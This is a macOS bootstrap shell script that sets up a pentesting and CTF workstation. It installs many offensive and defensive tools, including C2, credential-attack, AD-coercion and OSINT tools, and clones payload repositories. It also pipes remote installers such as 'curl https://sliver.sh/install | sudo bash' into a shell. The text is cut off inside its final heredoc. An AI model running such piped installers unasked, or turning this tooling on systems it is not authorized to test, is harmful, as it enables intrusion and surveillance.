#!/usr/bin/env bash
set -Eeuo pipefail

############################################
# mac-cyber-bootstrap.sh
# Full macOS bootstrap for cybersecurity / CTF / bug bounty
# For authorized testing, labs, and CTFs only.
#
# Author : srhoe (https://github.com/srhoe)
# Repo   : https://github.com/srhoe/mac-cyber-bootstrap
#
# All tools and workspaces are organized under ~/pentester/
#
# Categories:
#   - Core / Terminal Tooling
#   - Recon / OSINT
#   - Web Application Testing
#   - Network / Protocol Analysis
#   - Credential / Password Attacks
#   - Active Directory / Windows / SMB
#   - Red Team / C2 / Post-Exploitation
#   - Reverse Engineering / Binary Exploitation
#   - Blue Team / DFIR / Malware Analysis
#   - Cloud Security (AWS / Azure / GCP)
#   - Wireless / Hardware
#   - GUI Applications
#   - Python (pipx) Tools
#   - Rust (cargo) Tools
#   - Go Tools
#   - Repos / Wordlists
############################################

### ---------- helpers ----------
log()   { printf "\n[+] %s\n" "$*"; }
warn()  { printf "\n[!] %s\n" "$*" >&2; }
ok()    { printf "[✓] %s\n" "$*"; }
fail()  { printf "\n[x] %s\n" "$*" >&2; exit 1; }

trap 'warn "An unexpected error happened on line $LINENO. Review the output above."' ERR

### ---------- preflight ----------
require_macos() {
  [[ "$(uname -s)" == "Darwin" ]] || fail "This script is for macOS only."
}

install_xcode_clt() {
  if xcode-select -p >/dev/null 2>&1; then
    ok "Xcode Command Line Tools already installed."
    return
  fi
  log "Installing Xcode Command Line Tools..."
  xcode-select --install || true
  warn "If a popup appeared, complete it. This script will wait."
  until xcode-select -p >/dev/null 2>&1; do
    sleep 10
    printf "."
  done
  echo
  ok "Xcode Command Line Tools installed."
}

install_homebrew() {
  if command -v brew >/dev/null 2>&1; then
    ok "Homebrew already installed."
  else
    log "Installing Homebrew..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
  fi
  if [[ -x /opt/homebrew/bin/brew ]]; then
    eval "$(/opt/homebrew/bin/brew shellenv)"
  elif [[ -x /usr/local/bin/brew ]]; then
    eval "$(/usr/local/bin/brew shellenv)"
  else
    fail "brew installed but not found in expected locations."
  fi
}

ensure_shell_profile() {
  local profile_file brew_line path_line
  if [[ "${SHELL:-}" == */zsh ]]; then
    profile_file="$HOME/.zprofile"
  else
    profile_file="$HOME/.bash_profile"
  fi
  if [[ -x /opt/homebrew/bin/brew ]]; then
    brew_line='eval "$(/opt/homebrew/bin/brew shellenv)"'
  else
    brew_line='eval "$(/usr/local/bin/brew shellenv)"'
  fi
  path_line='export PATH="$HOME/.local/bin:$HOME/go/bin:$HOME/.cargo/bin:$PATH"'
  touch "$profile_file"
  grep -Fq "$brew_line" "$profile_file" || echo "$brew_line" >> "$profile_file"
  grep -Fq "$path_line" "$profile_file" || echo "$path_line" >> "$profile_file"
  ok "Shell profile updated: $profile_file"
}

### ---------- dirs ----------
# Everything lives under ~/pentester/ for a clean workspace
create_dirs() {
  log "Creating pentester workspace directories..."
  mkdir -p "$HOME/pentester/tools"
  mkdir -p "$HOME/pentester/labs"
  mkdir -p "$HOME/pentester/wordlists"
  mkdir -p "$HOME/pentester/screenshots"
  mkdir -p "$HOME/pentester/reports"
  mkdir -p "$HOME/pentester/malware-samples"
  mkdir -p "$HOME/pentester/memory-dumps"
  mkdir -p "$HOME/pentester/pcaps"
  mkdir -p "$HOME/pentester/osint"
  mkdir -p "$HOME/pentester/osint/targets"
  mkdir -p "$HOME/pentester/osint/reports"
  mkdir -p "$HOME/pentester/osint/dumps"
  mkdir -p "$HOME/.local/bin"
  mkdir -p "$HOME/go/bin"
  mkdir -p "$HOME/.gf"
  ok "Pentester workspace created at ~/pentester/"
}

### ---------- brew helpers ----------
# FIX (issue reported by HappyG): guard with `brew list` BEFORE any brew
# invocation so no metadata fetch/download occurs for installed packages.
is_formula_installed() { brew list --formula "$1" >/dev/null 2>&1; }
is_cask_installed()    { brew list --cask    "$1" >/dev/null 2>&1; }

brew_taps() {
  log "Adding Homebrew taps..."
  brew tap sidaf/homebrew-pentest || true
  ok "Taps ready."
}

brew_update_upgrade() {
  log "Updating Homebrew..."
  brew update
  brew upgrade || true
}

### ---------- formulae ----------
install_formulae() {
  log "Installing CLI formulae..."

  local formulae=(

    # -----------------------------------------------
    # CORE / TERMINAL
    # -----------------------------------------------
    git wget curl jq yq
    ripgrep fd bat tree tmux fzf
    coreutils moreutils gnu-sed grep gawk findutils
    watch htop btop ncdu rename
    unzip zip p7zip
    sqlite openssl@3 gnupg
    direnv stow zsh-completions
    asciinema        # record terminal sessions for write-ups / content
    glow             # render markdown in terminal
    lolcat figlet    # terminal aesthetics / banners

    # -----------------------------------------------
    # RUNTIMES
    # -----------------------------------------------
    python pipx go node ruby rustup openjdk

    # -----------------------------------------------
    # EDITORS / DB / MISC
    # -----------------------------------------------
    neovim mysql netcat socat tcpdump libpcap
    tshark           # CLI Wireshark — scriptable PCAP parsing

    # -----------------------------------------------
    # RECON / OSINT / SUBDOMAIN ENUMERATION
    # -----------------------------------------------
    nmap masscan
    amass subfinder httpx nuclei naabu dnsx
    gobuster feroxbuster ffuf wfuzz
    theharvester recon-ng
    wafw00f nikto
    whois inetutils
    dnsrecon         # DNS zone transfer, brute force, reverse lookup
    fierce           # DNS recon / subdomain brute forcing
    shodan           # Shodan CLI — query internet-facing assets
    exiftool         # deep file metadata extraction
    metagoofil       # metadata from public documents
    osquery          # live endpoint forensics and querying
    spiderfoot       # automated OSINT — domains, IPs, emails, usernames
    maltego          # OSINT link analysis (also a GUI cask below)

    # -----------------------------------------------
    # WEB APPLICATION TESTING
    # -----------------------------------------------
    sqlmap           # automated SQL injection
    zaproxy          # OWASP ZAP web app scanner

    # -----------------------------------------------
    # NETWORK / PROTOCOL ANALYSIS
    # -----------------------------------------------
    mtr              # traceroute + ping combined
    testssl          # TLS/SSL cipher assessment
    sslscan          # quick SSL version/cipher scanner
    proxychains-ng   # route traffic through SOCKS/HTTP proxies
    bettercap        # network attack, MITM, wireless recon
    iperf3 telnet

    # -----------------------------------------------
    # CREDENTIAL / PASSWORD ATTACKS
    # -----------------------------------------------
    hydra            # online password brute force
    john-jumbo       # John the Ripper community build
    hashcat          # GPU-accelerated password cracking
    hcxtools         # WPA/PCAP hash conversion for hashcat
    hcxdumptool      # capture WiFi handshakes
    bitwarden-cli    # password manager CLI

    # -----------------------------------------------
    # ACTIVE DIRECTORY / WINDOWS / SMB
    # -----------------------------------------------
    impacket         # Windows protocol suite (SMB, Kerberos, NTLM, DCOM)
    evil-winrm       # WinRM shell for pentesting
    kerbrute         # Kerberos username enum and password spray
    azurehound       # Azure/AAD BloodHound data collector
    smbmap           # SMB share enumeration
    samba            # smbclient on macOS
    openldap         # LDAP client tools (ldapsearch, ldapadd)
    enum4linux-ng    # SMB/LDAP enumeration rewrite

    # -----------------------------------------------
    # EXPLOITATION FRAMEWORKS
    # -----------------------------------------------
    metasploit       # industry-standard exploitation framework
    exploitdb        # searchsploit / local exploit-db

    # -----------------------------------------------
    # RED TEAM / PIVOTING / TUNNELING
    # -----------------------------------------------
    chisel           # TCP tunneling over HTTP for pivoting

    # -----------------------------------------------
    # REVERSE ENGINEERING / BINARY ANALYSIS
    # -----------------------------------------------
    radare2          # RE framework — disassembly, debugging, scripting
    binwalk          # firmware/binary analysis and extraction
    capstone         # disassembly engine library
    unicorn          # CPU emulator framework
    keystone-engine  # assembler framework
    yara             # pattern matching for malware identification
    foremost         # file carving / recovery

    # -----------------------------------------------
    # BLUE TEAM / DFIR / NETWORK DEFENSE
    # -----------------------------------------------
    zeek             # network traffic analysis / NSM framework
    suricata         # IDS/IPS with rule-based detection

    # -----------------------------------------------
    # CLOUD SECURITY
    # -----------------------------------------------
    awscli           # AWS CLI — cloud pentesting, SSRF validation
    azure-cli        # Azure CLI — pairs with AzureHound
    terraform        # IaC analysis and lab spins
    trufflehog       # secret scanning across git history
    gitleaks         # detect hardcoded secrets in repos

    # -----------------------------------------------
    # WIRELESS
    # -----------------------------------------------
    aircrack-ng      # WiFi security auditing suite

    # -----------------------------------------------
    # UTILITY / WORKFLOW
    # -----------------------------------------------
    semgrep          # static analysis / SAST
    gron             # make JSON greppable
    httpie           # human-friendly curl alternative
    xh               # fast Rust-based HTTP client
    dasel            # query/modify JSON, YAML, TOML, CSV
    gemini-cli       # Google Gemini CLI
  )

  for pkg in "${formulae[@]}"; do
    if is_formula_installed "$pkg"; then
      ok "$pkg already installed (skipping download)"
    else
      printf "  - installing formula: %s\n" "$pkg"
      brew install "$pkg" || warn "Failed to install formula: $pkg"
    fi
  done

  # Tapped formulae
  local tapped_formulae=(
    sidaf/homebrew-pentest/crackmapexec
  )
  for pkg in "${tapped_formulae[@]}"; do
    if is_formula_installed "$pkg"; then
      ok "$pkg already installed (skipping download)"
    else
      printf "  - installing tapped formula: %s\n" "$pkg"
      brew install "$pkg" || warn "Failed to install tapped formula: $pkg"
    fi
  done
}

### ---------- casks ----------
install_casks() {
  log "Installing GUI apps / casks..."

  local casks=(
    # Browsers / Privacy
    firefox tor-browser mullvad-vpn

    # Comms / Productivity
    discord signal telegram obsidian libreoffice
    visual-studio-code iterm2

    # Security GUI
    wireshark-app    # GUI Wireshark + tshark
    burp-suite       # web app intercepting proxy
    caido            # modern Burp alternative
    proxyman         # native macOS HTTP/HTTPS proxy debugger
    bloodhound       # AD attack path visualization
    maltego          # OSINT / link analysis GUI
    cutter           # Rizin/Radare2 GUI for reverse engineering
    ghidra           # NSA reverse engineering suite (free IDA alternative)

    # Cloud / Infra
    docker           # containers for lab environments
    cyberduck        # S3 / cloud storage browser
    gas-mask         # /etc/hosts profile switcher (lab target routing)

    # Security / Privacy Utilities
    bitwarden        # password manager GUI
    secretive        # SSH keys in Secure Enclave (T2/M-series)
    apparency        # inspect app code signatures and entitlements
  )

  for cask in "${casks[@]}"; do
    if is_cask_installed "$cask"; then
      ok "$cask already installed (skipping download)"
    else
      printf "  - installing cask: %s\n" "$cask"
      brew install --cask "$cask" || warn "Failed to install cask: $cask"
    fi
  done
}

### ---------- pipx (Python tools) ----------
setup_pipx() {
  log "Setting up pipx Python tools..."
  pipx ensurepath || true

  local pipx_apps=(

    # -----------------------------------------------
    # WEB / BUG BOUNTY
    # -----------------------------------------------
    dirsearch        # web path brute forcing
    paramspider      # mine URLs for parameters from web archives
    mitmproxy        # HTTPS MITM proxy
    jwt_tool         # JWT attack and analysis toolkit
    tplmap           # server-side template injection (SSTI) exploiter
    commix           # command injection automated exploiter
    arjun            # HTTP parameter discovery (finds hidden params)
    corscanner       # CORS misconfiguration scanner
    smuggler         # HTTP request smuggling detector

    # -----------------------------------------------
    # ACTIVE DIRECTORY / WINDOWS
    # -----------------------------------------------
    impacket         # Windows protocol suite — SMB, Kerberos, NTLM
    bloodhound-python # BloodHound data collector from Linux/macOS
    certipy-ad       # AD Certificate Services abuse (ESC1-ESC8)
    crackmapexec     # network pentesting multi-tool
    netexec          # actively maintained CrackMapExec fork
    pypykatz         # Mimikatz reimplemented in pure Python
    ldapdomaindump   # dump AD info over LDAP
    pywhisker        # shadow credentials / AD CS abuse
    coercer          # coerce Windows hosts to authenticate
    enum4linux       # classic SMB enumeration script

    # -----------------------------------------------
    # RED TEAM / EXPLOITATION
    # -----------------------------------------------
    pwntools         # CTF binary exploitation framework

    # -----------------------------------------------
    # CLOUD SECURITY
    # -----------------------------------------------
    pacu             # AWS exploitation framework
    scoutsuite       # multi-cloud security auditing (AWS/Azure/GCP)
    s3scanner        # find open/misconfigured S3 buckets

    # -----------------------------------------------
    # BLUE TEAM / DFIR / MALWARE ANALYSIS
    # -----------------------------------------------
    volatility3      # memory forensics — analyze RAM dumps
    oletools         # analyze Office macros and OLE documents
    pdfid            # detect malicious PDF indicators
    floss            # advanced string extraction from binaries
    yara-python      # YARA Python bindings

    # -----------------------------------------------
    # OSINT
    # -----------------------------------------------
    sherlock-project  # username enumeration across 400+ platforms
    holehe           # check if email is registered on sites
    maigret          # deep username OSINT (400+ sites + analysis)
    social-analyzer  # social media presence analyzer
    phoneinfoga      # phone number OSINT framework
    h8mail           # email breach hunter (HIBP, breach data)

    # -----------------------------------------------
    # UTILITY
    # -----------------------------------------------
    cython           # compile Python to C (useful in CTF reversing)
  )

  for app in "${pipx_apps[@]}"; do
    if pipx list 2>/dev/null | grep -q "$app"; then
      ok "$app already installed with pipx"
    else
      printf "  - pipx installing: %s\n" "$app"
      pipx install "$app" || warn "pipx install failed: $app"
    fi
  done
}

### ---------- Rust / cargo ----------
setup_rust() {
  log "Initializing Rust toolchain..."
  export PATH="$(brew --prefix rustup)/bin:$PATH"
  rustup default stable || true
  export PATH="$HOME/.cargo/bin:$PATH"

  log "Installing Rust-based security tools..."
  local cargo_tools=(
    rustscan         # fast full-port scanner; hands off to nmap
    feroxbuster      # fast recursive content discovery
    chainsaw         # fast Windows event log threat hunting (DFIR)
  )

  for tool in "${cargo_tools[@]}"; do
    if cargo install --list 2>/dev/null | grep -q "^$tool "; then
      ok "$tool already installed via cargo"
    else
      printf "  - cargo installing: %s\n" "$tool"
      cargo install "$tool" || warn "cargo install failed: $tool"
    fi
  done

  ok "Rust toolchain ready."
}

### ---------- Go tools ----------
setup_go_tools() {
  log "Installing Go-based tools..."
  export PATH="$HOME/go/bin:$PATH"

  local go_tools=(
    # tomnomnom suite
    github.com/tomnomnom/waybackurls@latest
    github.com/tomnomnom/assetfinder@latest
    github.com/tomnomnom/httprobe@latest
    github.com/tomnomnom/anew@latest
    github.com/tomnomnom/unfurl@latest
    github.com/tomnomnom/qsreplace@latest
    github.com/tomnomnom/gf@latest
    github.com/tomnomnom/meg@latest
    github.com/tomnomnom/concurl@latest

    # projectdiscovery suite
    github.com/projectdiscovery/katana/cmd/katana@latest
    github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest
    github.com/projectdiscovery/cdncheck/cmd/cdncheck@latest
    github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
    github.com/projectdiscovery/notify/cmd/notify@latest
    github.com/projectdiscovery/tlsx/cmd/tlsx@latest
    github.com/projectdiscovery/asnmap/cmd/asnmap@latest
    github.com/projectdiscovery/uncover/cmd/uncover@latest
    github.com/projectdiscovery/mapcidr/cmd/mapcidr@latest
    github.com/projectdiscovery/dnsx/cmd/dnsx@latest
    github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
    github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

    # web / bug bounty
    github.com/hakluke/hakrawler@latest
    github.com/lc/gau/v2/cmd/gau@latest
    github.com/OJ/gobuster/v3@latest
    github.com/hahwul/dalfox/v2@latest        # XSS parameter scanner
    github.com/dwisiswant0/crlfuzz@latest      # CRLF injection fuzzer
    github.com/ethicalhackingplayground/bxss@latest  # blind XSS injector
    github.com/003random/getJS@latest          # extract JS URLs from page
    github.com/KathanP19/Jsmon@latest          # JS file change monitoring
    github.com/d3mondev/puredns/v2@latest      # fast subdomain brute-forcer
    github.com/sw33tLie/sns@latest             # SNI sniffing — find vhosts
    github.com/Emoe/kxss@latest               # XSS parameter finder
    github.com/ffuf/ffuf/v2@latest             # fast web fuzzer

    # active directory / windows
    github.com/ropnop/windapsearch@latest      # LDAP enumeration
    github.com/ropnop/kerbrute@latest          # Kerberos brute force / spray

    # red team / pivoting / tunneling
    github.com/nicocha30/ligolo-ng/cmd/proxy@latest   # ligolo-ng proxy
    github.com/nicocha30/ligolo-ng/cmd/agent@latest   # ligolo-ng agent
    github.com/jpillora/chisel@latest                  # TCP tunnel over HTTP

    # cloud security
    github.com/BishopFox/cloudfox@latest       # cloud pentesting enumeration

    # blue team / DFIR
    github.com/Yamato-Security/hayabusa@latest # Windows event log forensics

    # osint
    github.com/projectdiscovery/uncover/cmd/uncover@latest  # Shodan/Fofa/Censys CLI

    # misc
    github.com/RedTeamPentesting/pretender@latest  # LLMNR/NBNS/mDNS spoofer
  )

  for tool in "${go_tools[@]}"; do
    printf "  - go install %s\n" "$tool"
    go install "$tool" || warn "Go install failed: $tool"
  done
}

### ---------- Manual installs ----------
install_manual_tools() {
  log "Installing tools requiring manual/scripted install..."

  # Sliver C2 — open-source adversary emulation (macOS supported)
  if command -v sliver >/dev/null 2>&1 || [[ -f /usr/local/bin/sliver ]]; then
    ok "Sliver C2 already installed"
  else
    log "Installing Sliver C2 framework..."
    curl https://sliver.sh/install | sudo bash || \
      warn "Sliver install failed — install manually: https://github.com/BishopFox/sliver"
  fi

  # pwndbg — GDB enhancement for binary exploitation / pwn CTFs
  if [[ -d "$HOME/pentester/tools/pwndbg" ]]; then
    ok "pwndbg already cloned"
    if ! grep -q "pwndbg" "$HOME/.gdbinit" 2>/dev/null; then
      cd "$HOME/pentester/tools/pwndbg" && ./setup.sh || warn "pwndbg setup.sh failed"
      cd "$HOME"
    fi
  else
    log "Cloning and installing pwndbg..."
    git clone --depth=1 https://github.com/pwndbg/pwndbg "$HOME/pentester/tools/pwndbg" && \
      cd "$HOME/pentester/tools/pwndbg" && ./setup.sh || \
      warn "pwndbg install failed — run $HOME/pentester/tools/pwndbg/setup.sh manually"
    cd "$HOME"
  fi

  # ROPgadget — ROP chain finder
  if command -v ROPgadget >/dev/null 2>&1; then
    ok "ROPgadget already installed"
  else
    pip3 install ROPgadget || warn "ROPgadget pip install failed"
  fi

  ok "Manual tool installs complete."
}

### ---------- gf patterns ----------
setup_gf_patterns() {
  log "Setting up gf patterns..."
  mkdir -p "$HOME/.gf"
  if [[ -d "$HOME/pentester/tools/Gf-Patterns" ]]; then
    cp "$HOME/pentester/tools/Gf-Patterns/"*.json "$HOME/.gf/" 2>/dev/null || true
    ok "gf patterns installed to ~/.gf"
  else
    warn "Gf-Patterns repo not found — run clone_repos first."
  fi
}

### ---------- repos / wordlists ----------
clone_repo_if_missing() {
  local repo_url="$1"
  local target_dir="$2"
  if [[ -d "$target_dir/.git" || -d "$target_dir" ]]; then
    ok "$(basename "$target_dir") already exists"
  else
    git clone --depth=1 "$repo_url" "$target_dir" || warn "Clone failed: $repo_url"
  fi
}

clone_repos() {
  log "Cloning security repos and wordlists..."

  # Wordlists
  clone_repo_if_missing "https://github.com/danielmiessler/SecLists.git"                      "$HOME/pentester/wordlists/SecLists"
  clone_repo_if_missing "https://github.com/assetnote/wordlists.git"                          "$HOME/pentester/wordlists/assetnote"
  clone_repo_if_missing "https://github.com/Bo0oM/fuzz.txt.git"                               "$HOME/pentester/wordlists/fuzz.txt"
  clone_repo_if_missing "https://github.com/danielmiessler/RobotsDisallowed.git"              "$HOME/pentester/wordlists/RobotsDisallowed"

  # Payload / Reference
  clone_repo_if_missing "https://github.com/swisskyrepo/PayloadsAllTheThings.git"             "$HOME/pentester/tools/PayloadsAllTheThings"
  clone_repo_if_missing "https://github.com/payloadbox/xss-payload-list.git"                  "$HOME/pentester/tools/xss-payloads"
  clone_repo_if_missing "https://github.com/payloadbox/sql-injection-payload-list.git"        "$HOME/pentester/tools/sqli-payloads"
  clone_repo_if_missing "https://github.com/payloadbox/ssti-payloads.git"                     "$HOME/pentester/tools/ssti-payloads"

  # Web / Bug Bounty
  clone_repo_if_missing "https://github.com/s0md3v/XSStrike.git"                              "$HOME/pentester/tools/XSStrike"
  clone_repo_if_missing "https://github.com/EnableSecurity/wafw00f.git"                       "$HOME/pentester/tools/wafw00f-src"
  clone_repo_if_missing "https://github.com/laramies/theHarvester.git"                        "$HOME/pentester/tools/theHarvester-src"
  clone_repo_if_missing "https://github.com/m4ll0k/SecretFinder.git"                         "$HOME/pentester/tools/SecretFinder"
  clone_repo_if_missing "https://github.com/GerbenJavado/LinkFinder.git"                     "$HOME/pentester/tools/LinkFinder"
  clone_repo_if_missing "https://github.com/s0md3v/Corsy.git"                                "$HOME/pentester/tools/Corsy"
  clone_repo_if_missing "https://github.com/defparam/smuggler.git"                            "$HOME/pentester/tools/smuggler"

  # Active Directory / Windows
  clone_repo_if_missing "https://github.com/PowerShellMafia/PowerSploit.git"                  "$HOME/pentester/tools/PowerSploit"
  clone_repo_if_missing "https://github.com/lgandx/Responder.git"                             "$HOME/pentester/tools/Responder"
  clone_repo_if_missing "https://github.com/itm4n/PrivescCheck.git"                           "$HOME/pentester/tools/PrivescCheck"
  clone_repo_if_missing "https://github.com/ly4k/Certipy.git"                                 "$HOME/pentester/tools/Certipy"
  clone_repo_if_missing "https://github.com/p0dalirius/Coercer.git"                           "$HOME/pentester/tools/Coercer"
  clone_repo_if_missing "https://github.com/dirkjanm/BloodHound.py.git"                       "$HOME/pentester/tools/BloodHound.py"
  clone_repo_if_missing "https://github.com/dirkjanm/mitm6.git"                               "$HOME/pentester/tools/mitm6"
  clone_repo_if_missing "https://github.com/Kevin-Robertson/Inveigh.git"                      "$HOME/pentester/tools/Inveigh"

  # Privilege Escalation
  clone_repo_if_missing "https://github.com/carlospolop/PEASS-ng.git"                         "$HOME/pentester/tools/PEASS-ng"
  clone_repo_if_missing "https://github.com/rebootuser/LinEnum.git"                           "$HOME/pentester/tools/LinEnum"
  clone_repo_if_missing "https://github.com/DominicBreuker/pspy.git"                          "$HOME/pentester/tools/pspy"

  # Red Team / Post-Exploitation
  clone_repo_if_missing "https://github.com/Flangvik/SharpCollection.git"                     "$HOME/pentester/tools/SharpCollection"

  # Blue Team / DFIR / Malware Analysis
  clone_repo_if_missing "https://github.com/volatilityfoundation/volatility3.git"             "$HOME/pentester/tools/volatility3"
  clone_repo_if_missing "https://github.com/SigmaHQ/sigma.git"                               "$HOME/pentester/tools/sigma"
  clone_repo_if_missing "https://github.com/Neo23x0/YARA-Rules.git"                          "$HOME/pentester/tools/YARA-Rules"
  clone_repo_if_missing "https://github.com/mandiant/capa.git"                                "$HOME/pentester/tools/capa"
  clone_repo_if_missing "https://github.com/WithSecureLabs/chainsaw.git"                      "$HOME/pentester/tools/chainsaw"
  clone_repo_if_missing "https://github.com/Yamato-Security/hayabusa.git"                     "$HOME/pentester/tools/hayabusa"

  # Cloud Security
  clone_repo_if_missing "https://github.com/RhinoSecurityLabs/pacu.git"                       "$HOME/pentester/tools/pacu"
  clone_repo_if_missing "https://github.com/nccgroup/ScoutSuite.git"                          "$HOME/pentester/tools/ScoutSuite"
  clone_repo_if_missing "https://github.com/BishopFox/cloudfox.git"                          "$HOME/pentester/tools/cloudfox"
  clone_repo_if_missing "https://github.com/dirkjanm/ROADtools.git"                          "$HOME/pentester/tools/ROADtools"
  clone_repo_if_missing "https://github.com/fox-it/TeamFiltration.git"                       "$HOME/pentester/tools/TeamFiltration"
  clone_repo_if_missing "https://github.com/andresriancho/enumerate-iam.git"                 "$HOME/pentester/tools/enumerate-iam"

  # Reverse Engineering
  clone_repo_if_missing "https://github.com/pwndbg/pwndbg.git"                               "$HOME/pentester/tools/pwndbg"
  clone_repo_if_missing "https://github.com/JonathanSalwan/ROPgadget.git"                    "$HOME/pentester/tools/ROPgadget"

  # OSINT
  clone_repo_if_missing "https://github.com/sherlock-project/sherlock.git"                    "$HOME/pentester/osint/sherlock"
  clone_repo_if_missing "https://github.com/megadose/holehe.git"                              "$HOME/pentester/osint/holehe"
  clone_repo_if_missing "https://github.com/soxoj/maigret.git"                               "$HOME/pentester/osint/maigret"
  clone_repo_if_missing "https://github.com/smicallef/spiderfoot.git"                        "$HOME/pentester/osint/spiderfoot"
  clone_repo_if_missing "https://github.com/sundowndev/phoneinfoga.git"                       "$HOME/pentester/osint/phoneinfoga"
  clone_repo_if_missing "https://github.com/khast3x/h8mail.git"                              "$HOME/pentester/osint/h8mail"
  clone_repo_if_missing "https://github.com/laramies/theHarvester.git"                        "$HOME/pentester/osint/theHarvester"
  clone_repo_if_missing "https://github.com/lanmaster53/recon-ng.git"                         "$HOME/pentester/osint/recon-ng"
  clone_repo_if_missing "https://github.com/Datalux/Osintgram.git"                            "$HOME/pentester/osint/osintgram"
  clone_repo_if_missing "https://github.com/mxrch/GHunt.git"                                  "$HOME/pentester/osint/ghunt"

  # Automation / Workflow
  clone_repo_if_missing "https://github.com/projectdiscovery/nuclei-templates.git"            "$HOME/pentester/tools/nuclei-templates"
  clone_repo_if_missing "https://github.com/projectdiscovery/fuzzing-templates.git"           "$HOME/pentester/tools/fuzzing-templates"
  clone_repo_if_missing "https://github.com/1ndianl33t/Gf-Patterns.git"                      "$HOME/pentester/tools/Gf-Patterns"
  clone_repo_if_missing "https://github.com/Tib3rius/AutoRecon.git"                           "$HOME/pentester/tools/AutoRecon"
  clone_repo_if_missing "https://github.com/21y4d/nmapAutomator.git"                          "$HOME/pentester/tools/nmapAutomator"
}

### ---------- volatility3 venv ----------
setup_volatility3() {
  log "Setting up volatility3 Python venv..."
  local vol_dir="$HOME/pentester/tools/volatility3"

  if [[ ! -d "$vol_dir" ]]; then
    warn "volatility3 repo not found — run clone_repos first."
    return
  fi

  if [[ ! -d "$vol_dir/venv" ]]; then
    python3 -m venv "$vol_dir/venv"
  fi

  "$vol_dir/venv/bin/pip" install --upgrade pip --quiet
  "$vol_dir/venv/bin/pip" install volatility3 --quiet || \
    warn "volatility3 pip install failed"

  ok "volatility3 venv ready."
}

### ---------- aliases / shell config ----------
append_once() {
  local line="$1" file="$2"
  grep -Fq "$line" "$file" || echo "$line" >> "$file"
}

write_shell_config() {
  local rc_file
  if [[ "${SHELL:-}" == */zsh ]]; then
    rc_file="$HOME/.zshrc"
  else
    rc_file="$HOME/.bashrc"
  fi
  touch "$rc_file"
  log "Writing aliases to $rc_file..."

  append_once '' "$rc_file"
  append_once '# =============================================' "$rc_file"
  append_once '# srhoe/mac-cyber-bootstrap — shell config' "$rc_file"
  append_once '# =============================================' "$rc_file"

  # PATH
  append_once 'export PATH="$HOME/.local/bin:$HOME/go/bin:$HOME/.cargo/bin:$PATH"' "$rc_file"
  append_once 'export EDITOR="nvim"' "$rc_file"

  # Pentester workspace shortcuts
  append_once 'export PENTESTER="$HOME/pentester"' "$rc_file"
  append_once 'export TOOLS="$HOME/pentester/tools"' "$rc_file"
  append_once 'export WORDLISTS="$HOME/pentester/wordlists/SecLists"' "$rc_file"
  append_once 'export ASSETNOTE="$HOME/pentester/wordlists/assetnote"' "$rc_file"
  append_once 'export PAYLOADS="$HOME/pentester/tools/PayloadsAllTheThings"' "$rc_file"
  append_once 'export PEASS="$HOME/pentester/tools/PEASS-ng"' "$rc_file"
  append_once 'export OSINT="$HOME/pentester/osint"' "$rc_file"

  # Navigation
  append_once 'alias ll="ls -lah"' "$rc_file"
  append_once 'alias pentester="cd $HOME/pentester"' "$rc_file"
  append_once 'alias ctf="cd $HOME/pentester/labs"' "$rc_file"
  append_once 'alias tools="cd $HOME/pentester/tools"' "$rc_file"
  append_once 'alias wordlists="cd $HOME/pentester/wordlists"' "$rc_file"
  append_once 'alias reports="cd $HOME/pentester/reports"' "$rc_file"
  append_once 'alias dumps="cd $HOME/pentester/memory-dumps"' "$rc_file"
  append_once 'alias pcaps="cd $HOME/pentester/pcaps"' "$rc_file"
  append_once 'alias osint="cd $HOME/pentester/osint"' "$rc_file"

  # Network
  append_once 'alias ports="lsof -i -P -n | grep LISTEN || true"' "$rc_file"
  append_once 'alias myip="curl -4 ifconfig.me && echo"' "$rc_file"
  append_once 'alias myip6="curl -6 ifconfig.me && echo"' "$rc_file"
  append_once 'alias grepip="grep -Eo '\''([0-9]{1,3}\.){3}[0-9]{1,3}'\''"' "$rc_file"
  append_once 'alias listening="lsof -iTCP -sTCP:LISTEN -P -n"' "$rc_file"

  # Web tools
  append_once 'alias pyserver="python3 -m http.server 8000"' "$rc_file"
  append_once 'alias http="http --verify=no"' "$rc_file"

  # Scanning
  append_once 'alias nmapfull="nmap -sC -sV -p- --open"' "$rc_file"
  append_once 'alias nmapquick="nmap -sC -sV --top-ports 1000"' "$rc_file"
  append_once 'alias rustscan="rustscan --ulimit 5000"' "$rc_file"
  append_once 'alias autorecon="python3 $HOME/pentester/tools/AutoRecon/autorecon.py"' "$rc_file"
  append_once 'alias nmapauto="$HOME/pentester/tools/nmapAutomator/nmapAutomator.sh"' "$rc_file"

  # AD / Windows
  append_once 'alias bloodhound-start="neo4j start && bloodhound &"' "$rc_file"
  append_once 'alias linpeas="bash $HOME/pentester/tools/PEASS-ng/linPEAS/linpeas.sh"' "$rc_file"
  append_once 'alias responder="sudo python3 $HOME/pentester/tools/Responder/Responder.py"' "$rc_file"

  # DFIR
  append_once 'alias vol3="$HOME/pentester/tools/volatility3/venv/bin/python $HOME/pentester/tools/volatility3/vol.py"' "$rc_file"

  # OSINT shortcuts
  append_once 'alias sherlock="python3 $HOME/pentester/osint/sherlock/sherlock"' "$rc_file"
  append_once 'alias spiderfoot="python3 $HOME/pentester/osint/spiderfoot/sf.py"' "$rc_file"
  append_once 'alias ghunt="python3 $HOME/pentester/osint/ghunt/hunt.py"' "$rc_file"

  # Misc
  append_once 'alias searchsploit="searchsploit"' "$rc_file"
  append_once 'alias reload="source ~/.zshrc 2>/dev/null || source ~/.bashrc"' "$rc_file"

  ok "Shell config updated: $rc_file"
}

### ---------- post-install updates ----------
finalize_tools() {
  log "Running post-install updates..."

  if command -v nuclei >/dev/null 2>&1; then
    nuclei -update-templates || warn "nuclei template update failed"
  fi

  if [[ -d "$HOME/pentester/tools/nuclei-templates/.git" ]]; then
    git -C "$HOME/pentester/tools/nuclei-templates" pull || true
  fi

  if command -v searchsploit >/dev/null 2>&1; then
    searchsploit -u || warn "searchsploit update failed"
  fi

  ok "Post-install tasks complete."
}

### ---------- manual notes ----------
manual_notes() {
  cat <<'EOF'

==========================================================
  mac-cyber-bootstrap — by srhoe
  https://github.com/srhoe/mac-cyber-bootstrap
==========================================================

ALL TOOLS INSTALLED UNDER: ~/pentester/

  ~/pentester/
  ├── tools/          → cloned repos and custom tools
  ├── labs/           → CTF and lab workspaces
  ├── wordlists/      → SecLists, assetnote, and others
